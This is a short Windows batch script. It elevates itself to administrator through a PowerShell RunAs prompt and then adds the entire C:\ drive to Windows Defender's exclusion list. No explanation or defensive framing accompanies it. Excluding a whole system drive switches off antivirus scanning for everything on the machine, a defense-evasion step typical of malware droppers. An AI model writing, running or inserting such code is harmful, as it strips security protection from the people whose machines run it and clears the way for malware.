@echo off
:: Check for admin privileges
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit)

:: Add 'C' to Windows Defender Exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
